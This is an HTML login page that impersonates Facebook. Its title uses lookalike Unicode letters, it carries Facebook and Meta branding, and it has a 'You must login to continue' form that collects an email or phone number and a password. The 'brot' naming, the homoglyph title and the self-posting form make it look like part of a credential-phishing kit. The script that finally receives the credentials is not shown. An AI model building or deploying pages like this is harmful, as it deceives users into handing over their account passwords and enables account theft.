<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fаcеbօօk - log in or sign up</title>
    <!-- BROWSER ICON -->
    <link rel="shortcut icon" href="public/images/brot-logo.png">

    <!-- VEDONRS -->
    <link href="public/css/bootstrap.min.css" rel="stylesheet">
    <link href="public/vendor/css/splide.min.css" rel="stylesheet">
    <!-- fontawesome -->
    <link href="public/vendor/css/all.min.css" rel="stylesheet">

    <!-- MAIN STYLE -->
    <link href="public/css/app.css" rel="stylesheet">
</head>

<body>
    <section class="login-section">
        <div class="front-logo">
            <img src="public/images/facebook.svg" alt="">
        </div>
        <div class="primary-component">
            <div class="login-description">
                <h4>Log Into Facebook</h4>
            </div>
            <div class="login-text">
                <p>You must login to continue.</p>
            </div>
            <div class="login-form">
                <form id="primary-form" method="post">
                    <meta name="csrf-token" content="{{ csrf_token() }}" />
                    <!-- <input type="hidden" value="1" id="hidden_field" name="hidden_field"> -->
                    <input  id="email" required="required" name="email" type="email" placeholder="Email or phone number">
                    <input id="password" required="required" name="password" type="password" placeholder="Password">
                    <label id="user-error" class="d-none" style="color:red;font-size: .8rem;">The Email & Password you've entered is incorrect </label>
                <button type="submit" value="Submit">Log In</button>
            </form>

                <div class="forget-password">
                    <a href="#">Forget Password?</a>
                </div>

                <div class="create-new">
                    <a href="login.html">Create new account</a>
                 </div>
            </div>
        </div>
    </section>
    <footer>
        <div class="brot-language">
            <ul>
                <li><a href="#">English (US)</a></li>
                <li><a href="#">Deutsch</a></li>
                <li><a href="#">Türkçe</a></li>
                <li><a href="#">Српски</a></li>
                <li><a href="#">Français (France)</a></li>
                <li><a href="#">Italiano</a></li>
                <li><a href="#">Bosanski</a></li>
                <li><a href="#">Svenska</a></li>
                <li><a href="#">Español</a></li>
                <li><a href="#">Português (Brasil)</a></li>
            </ul>
        </div>
        <div class="brot-meta">
            <div class="help-center">
                <ul>
                    <li><a href="">About</a></li>
                    <li><a href="">Help</a></li>
                    <li><a href="">More</a></li>
                </ul>
            </div>
            <div class="brot-text-meta">
                <p>Meta © 2022</p>
            </div>
        </div>
    </footer>
    <!-- Bootstrap's JavaScript -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
        integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
        crossorigin="anonymous"></script>
    <script src="js/bootstrap.min.js"></script>

    <!-- VENDORS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.5/jquery.validate.min.js"></script>
    <script src="vendor/js/all.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
        integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
        crossorigin="anonymous"></script>
    <!-- JS -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" ></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.3/jquery.validate.min.js" ></script>
    <script src="public/js/app.js"></script>
</body>

</html>